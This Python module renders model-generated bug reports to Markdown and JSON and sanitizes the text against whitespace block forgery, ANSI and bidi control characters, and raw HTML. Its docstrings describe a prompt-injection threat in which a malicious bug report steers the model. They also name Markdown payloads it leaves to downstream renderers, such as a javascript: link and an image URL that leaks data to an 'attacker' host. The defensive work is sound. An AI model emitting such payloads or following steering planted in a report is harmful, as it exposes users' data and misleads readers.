"""Rendering the canonical report to the user-facing output formats.

This module is the plugin's security surface, kept together on purpose. The
report text is attacker-influenced (a malicious bug report can steer the model,
and verbatim error text is echoed back), and the Markdown is shown to humans —
in a terminal for ``/improve-bug``, or rendered as HTML downstream.
``_sanitize_for_md`` is the chokepoint that makes a model-produced string safe
to embed. The ``json`` output is intentionally exempt (see ``format_output``).
"""

from __future__ import annotations

import json
import unicodedata

from .domain import ImprovedBugReport


def _sanitize_for_md(text: str) -> str:
    """Make a model-produced string safe to embed in the rendered Markdown.

    The report text is ultimately attacker-influenced (a malicious bug report can
    steer the model, and verbatim error text is echoed back), and the Markdown is
    shown to humans — in a terminal for ``/improve-bug``, or rendered as HTML
    downstream. So before interpolating any field we:

    1. collapse all whitespace to single spaces, so a stray newline cannot forge a
       new block (a fake ``## Severity`` heading or list item);
    2. drop Unicode control/format characters, removing the ESC byte (ANSI escape
       injection in a terminal) and bidi overrides (text-spoofing);
    3. HTML-escape ``& < >``, so the text cannot smuggle live HTML / ``<script>``
       through a renderer that passes raw HTML.

    This does NOT neutralize Markdown link/image syntax (``[x](javascript:…)``,
    ``![](http://attacker/?leak)``); escaping those would mangle legitimate report
    text, so downstream HTML renderers must still use a sanitizing renderer (no raw
    HTML, restricted URL schemes) — see the README's Security section. The ``json``
    output is exempt: it returns the exact text, structurally escaped by the JSON
    encoder, and leaves display escaping to the consumer.
    """
    text = " ".join(text.split())
    text = "".join(ch for ch in text if unicodedata.category(ch)[0] != "C")
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _text_block(title: str, body: str) -> str:
    """A ``## heading`` followed by one sanitized text block (fallback if empty)."""
    return f"## {title}\n\n{_sanitize_for_md(body) or '_Not provided._'}"


def _list_block(title: str, items: list[str], empty: str, *, ordered: bool) -> str:
    """A ``## heading`` followed by a sanitized list (fallback text if empty)."""
    if not items:
        body = empty
    elif ordered:
        body = "\n".join(f"{i}. {_sanitize_for_md(s)}" for i, s in enumerate(items, 1))
    else:
        body = "\n".join(f"- {_sanitize_for_md(s)}" for s in items)
    return f"## {title}\n\n{body}"


def render_markdown(report: ImprovedBugReport) -> str:
    """Render the canonical report as Markdown; blocks are joined by blank lines."""
    blocks = [
        f"# {_sanitize_for_md(report.title)}",
        _sanitize_for_md(report.summary) or "_Not provided._",
        _list_block(
            "Reproduction Steps", report.reproduction_steps, "_None provided._", ordered=True
        ),
        _text_block("Expected Behavior", report.expected_behavior),
        _text_block("Actual Behavior", report.actual_behavior),
        _text_block(
            f"Severity: {_sanitize_for_md(report.severity)}", report.severity_rationale
        ),
        _list_block(
            "Missing Evidence",
            report.missing_evidence,
            "_None — the report appears complete._",
            ordered=False,
        ),
    ]
    return "\n\n".join(blocks)


def format_output(report: ImprovedBugReport, fmt: str) -> str:
    if fmt == "json":
        # ensure_ascii=True escapes U+2028/U+2029: valid in JSON but they break
        # JavaScript string literals if this JSON is later embedded in a page.
        return json.dumps(report.to_dict(), ensure_ascii=True, indent=2)
    return render_markdown(report)
